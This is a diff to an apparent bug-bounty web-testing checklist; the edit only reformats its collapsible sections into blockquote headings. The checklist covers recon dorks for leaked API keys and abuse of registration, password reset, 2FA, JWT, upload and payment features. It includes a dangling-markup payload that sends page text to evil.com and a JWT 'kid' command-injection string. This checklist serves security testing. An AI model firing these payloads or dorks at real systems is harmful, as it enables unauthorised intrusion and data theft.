@@ -6,9 +6,7 @@ description: >-
 
 # Hunting Methodology
 
-<details>
-
-<summary><em><strong>Recon</strong></em></summary>
+> _**Recon**_
 
 * [ ] Automation
 
@@ -37,11 +35,7 @@ description: >-
   * `intitle:"index of" intext:"apikey.txt" site:target.tld`
   * `allintext:"API_SECRET*" ext:env | ext:yml site:target.tld`
 
-</details>
-
-<details>
-
-<summary><em><strong>Low Hanging Fruits</strong></em></summary>
+> _**Low Hanging Fruits**_
 
 * [ ] [DNS-ZONE-TRANSFER-CHECKER](https://pentest-tools.com/network-vulnerability-scanning/dns-zone-transfer-check) -> P4
 * [ ] SPF/DMARC Bugs using [mxtoolbox](https://mxtoolbox.com/dmarc.aspx) -> P3 -> DMARC only [DMARC Inspector](https://dmarcian.com/dmarc-inspector/) -> P4
@@ -57,13 +51,7 @@ description: >-
   * In order for this to qualify for the client and server-side variant, you'd need to demonstrate that the session identifiers are not removed from the browser at the time of log out
 * [ ] No Password Policy -> Password:`123`
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>Registration Abuse</strong></em></summary>
+> _**\[\[Registration]] Abuse**_
 
 * [ ] Username/Email Enumeration > Non-Brute Force
 * [ ] SQL Injection
@@ -123,13 +111,7 @@ description: >-
 * [ ] **PATH Overwrite**
 * [ ] **\[\[XSS\_HTML Injection|XSS\_HTML Injection]] in username/email for registration**
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>CAPTCHA Feature Abuse</strong></em></summary>
+> _**\[\[CAPTCHA Feature]] Abuse**_
 
 * [ ] [**Captcha Bypass via response manipulation**](https://bugcrowd.com/disclosures/55b40919-2c02-402c-a2cc-7184349926d7/login-capctha-bypass)
 * [ ] **Do not send the parameter** related to the captcha.
@@ -143,13 +125,7 @@ description: >-
 * [ ] If the captcha consists on a **mathematical operation** try to **automate** the **calculation.**
 * [ ] Enter CAPTCHA as a Boolean value (`True`)
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>Contact us Feature</strong></em></summary>
+> _**\[\[Contact us Feature]]**_
 
 * [ ] [**There is no rate limit for contact-us endpoints**](https://hackerone.com/reports/856305)
 * [ ] [Blind XSS on image upload support chat](https://hackerone.com/reports/1010466)
@@ -171,13 +147,7 @@ description: >-
     <form action=http://google.com><input type="submit">Click Me</input><select name=xss><option																<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
     ```
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>Reset Password Abuse</strong></em></summary>
+> _**\[\[Reset Password]] Abuse**_
 
 * [ ] Failure to Invalidate Session -> On Password Reset and/or Change
 * [ ] Password Reset Token Sent Over HTTP
@@ -194,13 +164,7 @@ description: >-
 * [ ] [**IDN Homograph Attack leads to ATO**](https://infosecwriteups.com/how-i-was-able-to-change-victims-password-using-idn-homograph-attack-587111843aff)
 * [ ] `victim.com@attacker.com` -> [0xacb.com/normalization\_table](https://0xacb.com/normalization_table) -> Host Header Injection
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>Profile - Settings</strong></em></summary>
+> _**\[\[Profile - Settings]]**_
 
 * [ ] [Missing rate limit in current password](https://hackerone.com/reports/1170522)
 * [ ] \[\[JSON Tests Cheat Sheet]]
@@ -230,13 +194,7 @@ description: >-
   * In order for this to qualify for the client and server-side variant, you'd need to demonstrate that the session identifiers are not removed from the browser at the time of log out
 * [ ] Link Account with Gmail and copy the response -> Attacker request to link with victim gmail -> intercept the response and paste the response from step 1
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>Testing Authorization</strong></em></summary>
+> _**Testing \[\[Authorization-Schema]]**_
 
 * [ ] Use account-A's Cookie/ Authorization-token to access account-B's Resources/Objects
 * [ ] Use the **newsletter unsubscribe Session** to Access any Victim's PII
@@ -250,13 +208,7 @@ description: >-
 * [ ] Not Completed 2FA able to access any authenticated endpoints
 * [ ] follow a confirmation link for account `A` within the session of account `B` within an email confirmation flow -> it will link the verified email to account `B`
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>Newsletter Feature</strong></em></summary>
+> _**\[\[Newsletter Feature]]**_
 
 * [ ] \[\[IDOR]] via Changing the newsletter ID
 * [ ] Logout from your account -> check old emails and click to `unsubscribe` button -> this will redirect newsletter subscription/un-subscription Page -> Check Burp History requests sometimes they leaks user details -> Excessive Data Exposure
@@ -285,13 +237,7 @@ description: >-
 * [ ] [**Race Conditions in OAuth 2 API implementations**](https://hackerone.com/reports/55140)
 * [ ] OAuth Misconfiguration -> Account Squatting | Pre-ATO
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>2FA Feature Abuse</strong></em></summary>
+> _**2FA Feature Abuse**_
 
 * [ ] Weak 2FA Implementation > 2FA Secret Cannot be Rotated\
   Rotating the secret means changing this key periodically to enhance security. If the 2FA secret cannot be rotated, it means that once the secret is compromised, an attacker could potentially gain ongoing access to the account without the user’s knowledge, as there is no way for the user to change the secret.
@@ -316,13 +262,7 @@ description: >-
 * [ ] Password not checked when 2FA Disable
 * [ ] Clickjacking on 2FA Disabling Page
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>JWT Security Testing</strong></em></summary>
+> _**JWT Security Testing**_
 
 * [ ] Edit the JWT with another User ID / Email
 * [ ] Sensitive Data Exposure
@@ -342,13 +282,7 @@ description: >-
 * [ ] Command injection `kid: key.crt; whoami && python -m SimpleHTTPServer 1337 &`
 * [ ] Check that keys and secrets are different between ENVs
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>File Upload Feature Abuse</strong></em></summary>
+> _**File Upload Feature Abuse**_
 
 Reference:https://brutelogic.com.br/blog/file-upload-xss/
 
@@ -388,24 +322,12 @@ Reference:https://brutelogic.com.br/blog/file-upload-xss/
 * [ ] [XXE ON JPEG](https://hackerone.com/reports/836877)
 * [ ] [Create A picture that steals Data](https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba101)
 
-
-
-</details>
-
-<details>
-
-<summary><strong>Ban Feature Abuse</strong></summary>
+> **Ban Feature Abuse**
 
 * [ ] Try register account with the same name with you and block him
 * [ ] [**Banned user still able to invited to reports as a collabrator and reset the password**](https://hackerone.com/reports/1959219)
 
-
-
-</details>
-
-<details>
-
-<summary><strong>Commenting Feature Abuse</strong></summary>
+> **Commenting Feature Abuse**
 
 * [ ] \[\[IDOR|IDOR]] Posting comments impersonating some other users.
 * [ ] **DOM Clobbering**
@@ -414,13 +336,7 @@ Reference:https://brutelogic.com.br/blog/file-upload-xss/
 * [ ] Race Condition
 * [ ] Privilege Escalation
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>Chatting Features-Rich Editor Feature</strong></em></summary>
+> _**Chatting Features-Rich Editor Feature**_
 
 * [ ] HTML Injection
 * [ ] \[\[XSS\_HTML Injection]] in email id
@@ -437,13 +353,9 @@ Reference:https://brutelogic.com.br/blog/file-upload-xss/
 * [ ] flood the application using the session data of an old user > Improper Session Management
 * [ ] \[\[IDOR]]
 
+> _**Money Features Abuse**_
 
-
-</details>
-
-<details>
-
-<summary><em><strong>Money Features Abuse</strong></em></summary>
+> Premium Feature Abuse | Paywall Bypass | Purchasing Feature Abuse
 
 * [ ] Try **forcefully browsing** the areas or some particular endpoints which come under premium accounts
 * [ ] **Pay for a premium feature** and cancel your subscription. If you get a **refund** but the feature is still **usable**, it’s a monetary impact issue.
@@ -458,71 +370,35 @@ Reference:https://brutelogic.com.br/blog/file-upload-xss/
   * Pay in 1 currency say USD and try to get a refund in EUR. Due to the diff in conversion rates, it might be possible to gain more amount.
   * change USD to any poor currency
 
-Premium Feature Abuse | Paywall Bypass | Purchasing Feature Abuse
-
-</details>
-
-<details>
-
-<summary><strong>Refund Feature Abuse</strong></summary>
+> Refund Feature Abuse
 
 * [ ] Purchase a product (usually some subscription) and ask for a refund to see if the feature is still accessible.
 * [ ] Try for currency arbitrage
 * [ ] Try making multiple requests for subscription cancellation (race conditions) to see if you can get multiple refunds.
 
-
-
-</details>
-
-<details>
-
-<summary><strong>Cart/Wish list Abuse</strong></summary>
+> Cart/Wish list Abuse
 
 * [ ] Add a product in **negative quantity** with other products in positive quantity to balance the amount.
 * [ ] Add a product in more than the available quantity.
 * [ ] Try to see when you add a product to your Wish-list and move it to a cart if it is possible to move it to some other user’s cart or delete it from there.
 
-
-
-</details>
-
-<details>
-
-<summary><strong>Orders Page</strong></summary>
+> Orders Page
 
 * [ ] \[\[IDOR]]
 * [ ] Leaking Credit Card Details in Responses -> Exclusive data disclosure
 * [ ] If target support making accounts without confirming emails try to make order with victim account and then register account with the victim email if you found out previously made order's then it is a bug
 
-
-
-</details>
-
-<details>
-
-<summary><strong>Transfer Money</strong></summary>
+> Transfer Money
 
 * [ ] Bypass Transfer Money Limit with negative numbers
 * [ ] Borrow Money Without Return by Change the loan return date to --> 31/February
 
-
-
-</details>
-
-<details>
-
-<summary><strong>Gifts Feature</strong></summary>
+> Gifts Feature
 
 * [ ] [**Race Condition allows to redeem multiple times gift cards which leads to free "money"**](https://hackerone.com/reports/759247)
 * [ ] [**Race conditions can be used to bypass invitation limit**](https://hackerone.com/reports/115007)
 
-
-
-</details>
-
-<details>
-
-<summary><strong>Discount Checkout</strong></summary>
+> Discount Checkout
 
 * [ ] Apply the **same code** more than once to see if the coupon code is reusable.
 * [ ] Input the gift code and intercept the request and remove it from the request
@@ -534,24 +410,12 @@ Premium Feature Abuse | Paywall Bypass | Purchasing Feature Abuse
 * [ ] Try performing attacks that are caused by missing input sanitization such as **XSS, SQLi**, etc. on this field
 * [ ] Try adding discount codes on the products which **are not covered under discounted** items by tampering with the request on the server-side.
 
-
-
-</details>
-
-<details>
-
-<summary><strong>Delivery Charges Abuse</strong></summary>
+> Delivery Charges Abuse
 
 * [ ] Try tampering with the delivery charge rates to -ve values to see if the final amount can be reduced.
 * [ ] Try checking for the free delivery by tampering with the params.
 
-
-
-</details>
-
-<details>
-
-<summary><em><strong>Review Feature</strong></em></summary>
+> _**Review Feature**_
 
 * [ ] Some applications have an option where verified reviews are marked with some tick or it’s mentioned. Try to see if you can post a review as a **Verified Reviewer without purchasing that product**.
 * [ ] Some app provides you with an option to provide a rating on a scale of 1 to 5, try to go beyond/below the scale-like **provide 0 or 6 or -ve**.
@@ -560,7 +424,3 @@ Premium Feature Abuse | Paywall Bypass | Purchasing Feature Abuse
 * [ ] Try to post reviews like some other users.
 * [ ] Try **performing CSRF** on this functionality, often is not protected by tokens
 * [ ] Get Better Yearly Rates by tampering parameters like `‘yearly_rate’: ‘3644’`
-
-
-
-</details>
